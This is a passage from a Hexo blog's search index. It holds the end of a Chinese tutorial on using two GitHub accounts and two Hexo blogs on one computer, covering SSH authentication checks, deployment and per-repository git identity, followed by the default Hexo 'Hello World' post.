ssh -T git@github.com</span><br><span class="line">Hi dogdog! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">owner@Owners-MacBook-Pro:~/.ssh$ ssh -T git@catcat.github.com</span></span><br><span class="line"><span class="string">Hi catcat! You&#x27;</span>ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><h2 id="4、创建第二个Github账号的博客"><a href="#4、创建第二个Github账号的博客" class="headerlink" title="4、创建第二个Github账号的博客"></a>4、创建第二个Github账号的博客</h2><h3 id="4-1、创建catcat文件夹-下载hexo库"><a href="#4-1、创建catcat文件夹-下载hexo库" class="headerlink" title="4.1、创建catcat文件夹,下载hexo库"></a>4.1、创建catcat文件夹,下载hexo库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> catcat</span><br><span class="line"><span class="built_in">cd</span> catcat</span><br><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h3 id="4-2、启动本地服务"><a href="#4-2、启动本地服务" class="headerlink" title="4.2、启动本地服务"></a>4.2、启动本地服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/Blog/catcat$ hexo s</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>假装是一张图.jpg</p><h3 id="4-3、部署到GitHub-pages"><a href="#4-3、部署到GitHub-pages" class="headerlink" title="4.3、部署到GitHub pages"></a>4.3、部署到GitHub pages</h3><p>将catcat的公钥添加到第二个GitHub的ssh key中</p><p>设置配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/Blog/catcat$ vim _config.yml</span><br></pre></td></tr></table></figure><p>发布</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">owner@Owners-MacBook-Pro:~/Blog/catcat$ hexo clean</span><br><span class="line">owner@Owners-MacBook-Pro:~/Blog/catcat$ hexo g -d</span><br></pre></td></tr></table></figure><h2 id="5、补充"><a href="#5、补充" class="headerlink" title="5、补充"></a>5、补充</h2><p>如果之前有设置全局用户名和邮箱的话，需要unset一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> user.name</span><br><span class="line">git config --global --<span class="built_in">unset</span> user.email</span><br></pre></td></tr></table></figure><p>然后在不同的仓库下设置局部的用户名和邮箱<br>比如在公司的repository下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name <span class="string">&quot;yourname&quot;</span> </span><br><span class="line">git config user.email <span class="string">&quot;youremail&quot;</span> </span><br></pre></td></tr></table></figure><p>在自己的github的仓库再执行刚刚的命令一遍即可,这样就可以在不同的仓库，以不同的账号登录。</p><h2 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h2><p>1、<a href="https://www.jianshu.com/p/0ee8b976ceab">多个github帐号更新多个hexo博客</a></p><p>2、<a href="https://zhuanlan.zhihu.com/p/69218641">一台电脑部署两个或多个Hexo博客（一台电脑使用两个或多个 GitHub 账号）</a></p><p>3、<a href="https://blog.csdn.net/inthat/article/details/132116332">Git 用户名邮箱的全局配置和单仓库配置(不同项目使用不同账号登录)</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub Pages </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/11/22/hello-world/"/>
      <url>/2019/11/22/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
